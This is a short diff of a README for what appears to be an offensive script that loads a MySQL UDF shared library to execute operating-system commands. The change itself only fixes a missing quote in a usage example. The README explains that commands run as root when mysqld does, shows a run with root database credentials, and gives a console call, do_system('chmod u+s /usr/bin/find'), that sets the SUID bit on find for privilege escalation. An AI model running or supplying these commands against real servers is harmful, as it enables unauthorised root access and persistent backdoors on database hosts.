@@ -7,7 +7,7 @@ Using MySQL UDF to excute system commands
 # How does it works?
 The script use UDF shared library on MySQL to execute commands, if mysqld run as root, of course the passed (<b>-c</b>)ommand will be executed as root. On a 64bit *nix box you can pass the compiled .so included in this repo.<br/>
 How to use the script: `mysql_udf_exec_sys.sh -u mysql-user -p mysql-user-password -s shared-library-path -c command-to-be-executed`<br>
-e.g. `$ ./mysql_udf_exec_sys.sh -s lib_sys_udf.so -u root -p Secrete -c 'whoami > /tmp/whoM; chmod go+r /tmp/whoM;`
+e.g. `$ ./mysql_udf_exec_sys.sh -s lib_sys_udf.so -u root -p Secrete -c 'whoami > /tmp/whoM; chmod go+r /tmp/whoM;'
   Once the script has been correctly executed you can direct access the MySQL console and use the function <b>do_system</b> directly:<br>
 <pre>mysql> use mysql;
 mysql> select do_system('chmod u+s /usr/bin/find');
